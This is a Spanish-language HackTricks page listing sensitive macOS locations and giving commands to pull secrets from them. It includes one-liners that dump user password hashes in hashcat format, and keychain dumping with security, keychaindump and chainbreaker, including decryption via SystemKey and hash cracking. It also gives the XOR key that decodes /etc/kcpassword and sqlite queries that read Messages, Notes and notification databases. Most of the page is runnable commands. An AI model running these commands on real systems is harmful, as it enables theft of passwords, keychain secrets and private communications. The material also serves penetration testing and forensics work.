# Ubicaciones Sensibles de macOS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Contraseñas

### Contraseñas de Sombra

La contraseña de sombra se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
El siguiente oneliner se puede utilizar para volcar **toda la información sobre los usuarios** (incluida la información del hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este otro**](https://github.com/octomagon/davegrohl.git) se pueden utilizar para transformar el hash al **formato hashcat**.

Una alternativa en una sola línea que volcará credenciales de todas las cuentas que no sean de servicio en formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
### Volcado de llavero

Tenga en cuenta que al utilizar el binario de seguridad para **volcar las contraseñas descifradas**, se le pedirá al usuario que permita esta operación en varias ocasiones.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Según este comentario [juuso/keychaindump#10 (comentario)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) parece que estas herramientas ya no funcionan en Big Sur.
{% endhint %}

### Descripción de Keychaindump

Se ha desarrollado una herramienta llamada **keychaindump** para extraer contraseñas de los llaveros de macOS, pero enfrenta limitaciones en versiones más recientes de macOS como Big Sur, como se indica en una [discusión](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios a **root**. La herramienta explota el hecho de que el llavero se desbloquea por defecto al iniciar sesión del usuario por conveniencia, permitiendo que las aplicaciones accedan a él sin requerir la contraseña del usuario repetidamente. Sin embargo, si un usuario opta por bloquear su llavero después de cada uso, **keychaindump** se vuelve ineficaz.

**Keychaindump** opera apuntando a un proceso específico llamado **securityd**, descrito por Apple como un demonio para operaciones de autorización y criptográficas, crucial para acceder al llavero. El proceso de extracción implica identificar una **Clave Maestra** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del llavero. Para localizar la **Clave Maestra**, **keychaindump** escanea el montón de memoria de **securityd** utilizando el comando `vmmap`, buscando posibles claves dentro de áreas marcadas como `MALLOC_TINY`. El siguiente comando se utiliza para inspeccionar estas ubicaciones de memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Después de identificar posibles claves maestras, **keychaindump** busca a través de los montones de memoria un patrón específico (`0x0000000000000018`) que indica un candidato para la clave maestra. Se requieren pasos adicionales, incluida la deofuscación, para utilizar esta clave, como se describe en el código fuente de **keychaindump**. Los analistas que se centren en esta área deben tener en cuenta que los datos cruciales para descifrar el llavero se almacenan en la memoria del proceso **securityd**. Un ejemplo de comando para ejecutar **keychaindump** es:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) se puede utilizar para extraer los siguientes tipos de información de un llavero de OSX de manera forense:

* Contraseña de llavero con hash, adecuada para descifrar con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
* Contraseñas de Internet
* Contraseñas genéricas
* Claves privadas
* Claves públicas
* Certificados X509
* Notas seguras
* Contraseñas de Appleshare

Con la contraseña de desbloqueo del llavero, una clave maestra obtenida usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto plano.

Sin uno de estos métodos para desbloquear el llavero, Chainbreaker mostrará toda la información disponible.

#### **Volcar claves del llavero**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) crackeando el hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) con volcado de memoria**

[Siga estos pasos](..#dumping-memory-with-osxpmem) para realizar un **volcado de memoria**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) usando la contraseña de usuario**

Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar los llaveros que pertenecen al usuario**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

El archivo **kcpassword** es un archivo que contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **habilitado el inicio de sesión automático**. Por lo tanto, el usuario iniciará sesión automáticamente sin que se le pida una contraseña (lo cual no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** xored con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña de los usuarios es más larga que la clave, la clave se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo, utilizando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d). 

## Información interesante en bases de datos

### Mensajes
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificaciones

Puedes encontrar los datos de Notificaciones en `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La mayoría de la información interesante estará en **blob**. Por lo tanto, necesitarás **extraer** ese contenido y **transformarlo** a un formato **legible** para humanos o usar **`strings`**. Para acceder a ello, puedes hacer: 

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notas

Las **notas** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
